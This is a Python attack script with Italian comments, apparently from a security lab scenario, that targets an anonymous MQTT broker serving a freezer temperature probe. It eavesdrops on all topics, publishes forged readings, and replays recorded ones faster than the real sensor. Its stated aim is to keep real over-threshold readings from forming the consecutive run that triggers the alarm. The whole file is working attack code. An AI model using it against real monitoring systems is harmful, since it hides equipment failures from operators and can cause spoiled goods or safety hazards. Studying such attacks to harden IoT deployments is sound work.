"""Scenario 2: letture MQTT intercettate, falsificate o ripetute.

  python scenario2_letture.py ascolta [--secondi 15]
      si iscrive a tutti i topic (#) e mostra cosa passa sul broker

  python scenario2_letture.py falsifica [--temp -20] [--al-secondo 4] [--secondi 600]
      pubblica letture inventate sul topic della sonda

  python scenario2_letture.py replay [--registra 30] [--al-secondo 4] [--secondi 600]
      registra letture autentiche e poi le ripete in ciclo

Il server degli allarmi scatta solo dopo alcune letture consecutive sopra soglia.
Inviando letture "normali" più spesso della sonda vera, le letture reali non
riescono mai a formare una sequenza consecutiva e l'allarme non scatta.
"""

import argparse
import json
import os
import time
import uuid

import paho.mqtt.client as mqtt

BROKER = os.environ.get("BROKER_HOST", "10.77.10.20")
TOPIC = os.environ.get("DATA_TOPIC", "store/freezer1/temperature")


def connect(on_message=None):
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"att-{uuid.uuid4().hex[:6]}")
    if on_message:
        client.on_message = on_message
    # Nessuna credenziale: il broker accetta connessioni anonime.
    client.connect(BROKER, 1883)
    client.loop_start()
    return client


def listen(seconds):
    def show(client, userdata, msg):
        retained = " (retained)" if msg.retain else ""
        print(f"{msg.topic}{retained}: {msg.payload.decode(errors='replace')}")

    client = connect(show)
    client.subscribe("#")
    print(f"In ascolto su tutti i topic per {seconds} s\n")
    time.sleep(seconds)
    client.disconnect()


def spoof(temp, rate, seconds):
    client = connect()
    print(f"Pubblico {rate} letture false al secondo a {temp} °C su {TOPIC} per {seconds} s (Ctrl+C per fermare)")
    seq = 100000
    end = time.time() + seconds
    while time.time() < end:
        seq += 1
        payload = {"sensor": "probe1", "temp_c": temp, "ts": int(time.time()), "seq": seq}
        client.publish(TOPIC, json.dumps(payload))
        time.sleep(1 / rate)
    client.disconnect()


def replay(record_s, rate, seconds):
    recorded = []

    def store(client, userdata, msg):
        recorded.append(msg.payload)

    client = connect(store)
    client.subscribe(TOPIC)
    print(f"Registro le letture autentiche per {record_s} s")
    time.sleep(record_s)
    client.unsubscribe(TOPIC)
    if not recorded:
        raise SystemExit("Nessuna lettura registrata: la sonda sta pubblicando?")
    temps = [json.loads(p)["temp_c"] for p in recorded]
    print(f"Registrate {len(recorded)} letture, da {min(temps)} a {max(temps)} °C")
    print(f"Le ripeto identiche, {rate} al secondo, per {seconds} s (Ctrl+C per fermare)")
    end = time.time() + seconds
    i = 0
    while time.time() < end:
        client.publish(TOPIC, recorded[i % len(recorded)])
        i += 1
        time.sleep(1 / rate)
    client.disconnect()


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(dest="mode", required=True)
    a = sub.add_parser("ascolta")
    a.add_argument("--secondi", type=int, default=15)
    f = sub.add_parser("falsifica")
    f.add_argument("--temp", type=float, default=-20.0)
    f.add_argument("--al-secondo", type=float, default=4.0)
    f.add_argument("--secondi", type=int, default=600)
    r = sub.add_parser("replay")
    r.add_argument("--registra", type=int, default=30)
    r.add_argument("--al-secondo", type=float, default=4.0)
    r.add_argument("--secondi", type=int, default=600)
    args = parser.parse_args()
    try:
        if args.mode == "ascolta":
            listen(args.secondi)
        elif args.mode == "falsifica":
            spoof(args.temp, args.al_secondo, args.secondi)
        else:
            replay(args.registra, args.al_secondo, args.secondi)
    except KeyboardInterrupt:
        print("\nInterrotto")


if __name__ == "__main__":
    main()
